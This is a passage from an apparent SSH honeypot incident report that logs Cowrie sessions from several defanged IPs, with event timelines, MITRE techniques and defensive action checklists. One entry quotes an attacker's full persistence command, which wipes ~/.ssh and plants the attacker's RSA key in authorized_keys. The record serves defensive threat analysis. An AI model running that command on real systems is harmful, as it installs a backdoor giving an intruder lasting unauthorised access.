- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91b9fe600eb

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:12` | `cowrie.session.connect` |
| `2026-07-06 09:29:12` | `cowrie.client.version` |
| `2026-07-06 09:29:12` | `cowrie.client.kex` |
| `2026-07-06 09:29:14` | `cowrie.login.success` |
| `2026-07-06 09:29:15` | `cowrie.session.params` |
| `2026-07-06 09:29:15` | `cowrie.command.input` |
| `2026-07-06 09:29:15` | `cowrie.log.closed` |
| `2026-07-06 09:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8efc85b38fd0

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:15` | `cowrie.session.connect` |
| `2026-07-06 09:29:15` | `cowrie.client.version` |
| `2026-07-06 09:29:15` | `cowrie.client.kex` |
| `2026-07-06 09:29:16` | `cowrie.login.success` |
| `2026-07-06 09:29:17` | `cowrie.session.params` |
| `2026-07-06 09:29:17` | `cowrie.command.input` |
| `2026-07-06 09:29:17` | `cowrie.log.closed` |
| `2026-07-06 09:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b8cda5c6c9d

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:16` | `cowrie.session.connect` |
| `2026-07-06 09:29:16` | `cowrie.client.version` |
| `2026-07-06 09:29:17` | `cowrie.client.kex` |
| `2026-07-06 09:29:18` | `cowrie.login.success` |
| `2026-07-06 09:29:19` | `cowrie.session.params` |
| `2026-07-06 09:29:19` | `cowrie.command.input` |
| `2026-07-06 09:29:20` | `cowrie.log.closed` |
| `2026-07-06 09:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42aec6a1714d

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:18` | `cowrie.session.connect` |
| `2026-07-06 09:29:18` | `cowrie.client.version` |
| `2026-07-06 09:29:18` | `cowrie.client.kex` |
| `2026-07-06 09:29:20` | `cowrie.login.success` |
| `2026-07-06 09:29:21` | `cowrie.session.params` |
| `2026-07-06 09:29:21` | `cowrie.command.input` |
| `2026-07-06 09:29:21` | `cowrie.log.closed` |
| `2026-07-06 09:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7abf51b526ed

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:20` | `cowrie.session.connect` |
| `2026-07-06 09:29:20` | `cowrie.client.version` |
| `2026-07-06 09:29:20` | `cowrie.client.kex` |
| `2026-07-06 09:29:21` | `cowrie.login.success` |
| `2026-07-06 09:29:23` | `cowrie.session.params` |
| `2026-07-06 09:29:23` | `cowrie.command.input` |
| `2026-07-06 09:29:23` | `cowrie.log.closed` |
| `2026-07-06 09:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1c8811f8fd

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:21` | `cowrie.session.connect` |
| `2026-07-06 09:29:21` | `cowrie.client.version` |
| `2026-07-06 09:29:21` | `cowrie.client.kex` |
| `2026-07-06 09:29:23` | `cowrie.login.success` |
| `2026-07-06 09:29:23` | `cowrie.session.params` |
| `2026-07-06 09:29:23` | `cowrie.command.input` |
| `2026-07-06 09:29:24` | `cowrie.log.closed` |
| `2026-07-06 09:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6d2c378104

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:46` | `cowrie.session.connect` |
| `2026-07-06 09:29:49` | `cowrie.client.version` |
| `2026-07-06 09:29:49` | `cowrie.client.kex` |
| `2026-07-06 09:29:54` | `cowrie.login.success` |
| `2026-07-06 09:29:59` | `cowrie.session.params` |
| `2026-07-06 09:29:59` | `cowrie.command.input` |
| `2026-07-06 09:30:00` | `cowrie.log.closed` |
| `2026-07-06 09:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f304ca3d8f1

| Field | Detail |
|---|---|
| **Source IP** | `158.220.83[.]77` |
| **First Seen** | 2026-07-06 09:31 |
| **Last Seen** | 2026-07-06 09:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:31:53` | `cowrie.session.connect` |
| `2026-07-06 09:31:53` | `cowrie.client.version` |
| `2026-07-06 09:31:53` | `cowrie.client.kex` |
| `2026-07-06 09:31:53` | `cowrie.login.success` |
| `2026-07-06 09:31:54` | `cowrie.session.params` |
| `2026-07-06 09:31:54` | `cowrie.command.input` |
| `2026-07-06 09:31:54` | `cowrie.command.failed` |
| `2026-07-06 09:31:54` | `cowrie.log.closed` |
| `2026-07-06 09:31:55` | `cowrie.session.params` |
| `2026-07-06 09:31:55` | `cowrie.command.input` |
| `2026-07-06 09:31:55` | `cowrie.session.file_download` |
| `2026-07-06 09:31:55` | `cowrie.log.closed` |
| `2026-07-06 09:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.220.83[.]77` to AbuseIPDB if not already reported
- [ ] Block `158.220.83[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-224ea689652e

| Field | Detail |
|---|---|
| **Source IP** | `158.220.83[.]77` |
| **First Seen** | 2026-07-06 09:31 |
| **Last Seen** | 2026-07-06 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:31:55` | `cowrie.session.connect` |
| `2026-07-06 09:31:55` | `cowrie.client.version` |
| `2026-07-06 09:31:55` | `cowrie.client.kex` |
| `2026-07-06 09:31:55` | `cowrie.login.success` |
| `2026-07-06 09:31:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.220.83[.]77` to AbuseIPDB if not already reported
- [ ] Block `158.220.83[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3582d465c2b5

| Field | Detail |
|---|---|
| **Source IP** | `158.220.83[.]77` |
| **First Seen** | 2026-07-06 09:31 |
| **Last Seen** | 2026-07-06 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:31:55` | `cowrie.session.connect` |
| `2026-07-06 09:31:55` | `cowrie.client.version` |
| `2026-07-06 09:31:55` | `cowrie.client.kex` |
| `2026-07-06 09:31:56` | `cowrie.login.success` |
| `2026-07-06 09:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.220.83[.]77` to AbuseIPDB if not already reported
- [ ] Block `158.220.83[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c625abea8907

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 09:41 |
| **Last Seen** | 2026-07-06 09:42 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:41:56` | `cowrie.session.connect` |
| `2026-07-06 09:41:58` | `cowrie.client.version` |
| `2026-07-06 09:41:58` | `cowrie.client.kex` |
| `2026-07-06 09:42:04` | `cowrie.login.success` |
| `2026-07-06 09:42:08` | `cowrie.session.params` |
| `2026-07-06 09:42:08` | `cowrie.command.input` |
| `2026-07-06 09:42:09` | `cowrie.log.closed` |
| `2026-07-06 09:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c42f77a3c9b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 09:44 |
| **Last Seen** | 2026-07-06 09:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:44:16` | `cowrie.session.connect` |
| `2026-07-06 09:44:16` | `cowrie.client.version` |
| `2026-07-06 09:44:16` | `cowrie.client.kex` |
| `2026-07-06 09:44:16` | `cowrie.login.success` |
| `2026-07-06 09:44:16` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:44:16` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6fd1c8548d3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 09:54 |
| **Last Seen** | 2026-07-06 09:54 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:54:02` | `cowrie.session.connect` |
| `2026-07-06 09:54:03` | `cowrie.client.version` |
| `2026-07-06 09:54:03` | `cowrie.client.kex` |
| `2026-07-06 09:54:10` | `cowrie.login.success` |
| `2026-07-06 09:54:13` | `cowrie.session.params` |
| `2026-07-06 09:54:13` | `cowrie.command.input` |
| `2026-07-06 09:54:15` | `cowrie.log.closed` |
| `2026-07-06 09:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b79edc143de

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 09:57 |
| **Last Seen** | 2026-07-06 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:57:43` | `cowrie.session.connect` |
| `2026-07-06 09:57:43` | `cowrie.client.version` |
| `2026-07-06 09:57:43` | `cowrie.client.kex` |
| `2026-07-06 09:57:43` | `cowrie.login.success` |
| `2026-07-06 09:57:43` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:57:43` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8782ae5eee

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 09:58 |
| **Last Seen** | 2026-07-06 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:58:58` | `cowrie.session.connect` |
| `2026-07-06 09:58:58` | `cowrie.client.version` |
| `2026-07-06 09:58:58` | `cowrie.client.kex` |
| `2026-07-06 09:58:58` | `cowrie.login.success` |
| `2026-07-06 09:58:59` | `cowrie.session.params` |
| `2026-07-06 09:58:59` | `cowrie.command.input` |
| `2026-07-06 09:58:59` | `cowrie.log.closed` |
| `2026-07-06 09:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbed2dc7ac25

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 10:04 |
| **Last Seen** | 2026-07-06 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:04:34` | `cowrie.session.connect` |
| `2026-07-06 10:04:34` | `cowrie.client.version` |
| `2026-07-06 10:04:35` | `cowrie.client.kex` |
| `2026-07-06 10:04:35` | `cowrie.login.success` |
| `2026-07-06 10:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd7078015ec

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 10:04 |
| **Last Seen** | 2026-07-06 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:04:35` | `cowrie.session.connect` |
| `2026-07-06 10:04:35` | `cowrie.client.version` |
| `2026-07-06 10:04:35` | `cowrie.client.kex` |
| `2026-07-06 10:04:35` | `cowrie.login.success` |
| `2026-07-06 10:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a7d8232a67

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 10:04 |
| **Last Seen** | 2026-07-06 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:04:43` | `cowrie.session.connect` |
| `2026-07-06 10:04:43` | `cowrie.client.version` |
| `2026-07-06 10:04:43` | `cowrie.client.kex` |
| `2026-07-06 10:04:44` | `cowrie.login.success` |
| `2026-07-06 10:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed02ba5b88de

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 10:04 |
| **Last Seen** | 2026-07-06 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:04:44` | `cowrie.session.connect` |
| `2026-07-06 10:04:44` | `cowrie.client.version` |
| `2026-07-06 10:04:44` | `cowrie.client.kex` |
| `2026-07-06 10:04:44` | `cowrie.login.success` |
| `2026-07-06 10:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-887098005e60

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 10:06 |
| **Last Seen** | 2026-07-06 10:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:06:30` | `cowrie.session.connect` |
| `2026-07-06 10:06:31` | `cowrie.client.version` |
| `2026-07-06 10:06:31` | `cowrie.client.kex` |
| `2026-07-06 10:06:37` | `cowrie.login.success` |
| `2026-07-06 10:06:41` | `cowrie.session.params` |
| `2026-07-06 10:06:41` | `cowrie.command.input` |
| `2026-07-06 10:06:43` | `cowrie.log.closed` |
| `2026-07-06 10:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76bc232c45d

| Field | Detail |
|---|---|
| **Source IP** | `219.151.148[.]162` |
| **First Seen** | 2026-07-06 10:07 |
| **Last Seen** | 2026-07-06 10:09 |
| **Session Duration** | 93s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:07:54` | `cowrie.session.connect` |
| `2026-07-06 10:09:25` | `cowrie.client.version` |
| `2026-07-06 10:09:25` | `cowrie.client.kex` |
| `2026-07-06 10:09:26` | `cowrie.login.success` |
| `2026-07-06 10:09:27` | `cowrie.session.params` |
| `2026-07-06 10:09:27` | `cowrie.command.input` |
| `2026-07-06 10:09:27` | `cowrie.log.closed` |
| `2026-07-06 10:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.151.148[.]162` to AbuseIPDB if not already reported
- [ ] Block `219.151.148[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5258ab59873e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 10:09 |
| **Last Seen** | 2026-07-06 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:09:44` | `cowrie.session.connect` |
| `2026-07-06 10:09:44` | `cowrie.client.version` |
| `2026-07-06 10:09:45` | `cowrie.client.kex` |
| `2026-07-06 10:09:45` | `cowrie.login.success` |
| `2026-07-06 10:09:45` | `cowrie.direct-tcpip.request` |
| `2026-07-06 10:09:45` | `cowrie.direct-tcpip.data` |
| `2026-07-06 10:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241c3ffe6e1f

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-06 10:12 |
| **Last Seen** | 2026-07-06 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:12:11` | `cowrie.session.connect` |
| `2026-07-06 10:12:11` | `cowrie.client.version` |
| `2026-07-06 10:12:11` | `cowrie.client.kex` |
| `2026-07-06 10:12:11` | `cowrie.login.success` |
| `2026-07-06 10:12:12` | `cowrie.session.params` |
| `2026-07-06 10:12:12` | `cowrie.command.input` |
| `2026-07-06 10:12:12` | `cowrie.log.closed` |
| `2026-07-06 10:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb1c8a90a0b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 10:18 |
| **Last Seen** | 2026-07-06 10:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:18:55` | `cowrie.session.connect` |
| `2026-07-06 10:18:56` | `cowrie.client.version` |
| `2026-07-06 10:18:56` | `cowrie.client.kex` |
| `2026-07-06 10:19:02` | `cowrie.login.success` |
| `2026-07-06 10:19:05` | `cowrie.session.params` |
| `2026-07-06 10:19:05` | `cowrie.command.input` |
| `2026-07-06 10:19:07` | `cowrie.log.closed` |
| `2026-07-06 10:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b23a74c67bd9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:43` | `cowrie.session.connect` |
| `2026-07-06 10:22:43` | `cowrie.client.version` |
| `2026-07-06 10:22:43` | `cowrie.client.kex` |
| `2026-07-06 10:22:43` | `cowrie.login.success` |
| `2026-07-06 10:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8a89801244

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:45` | `cowrie.session.connect` |
| `2026-07-06 10:22:45` | `cowrie.client.version` |
| `2026-07-06 10:22:45` | `cowrie.client.kex` |
| `2026-07-06 10:22:45` | `cowrie.login.success` |
| `2026-07-06 10:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2128afcc761b

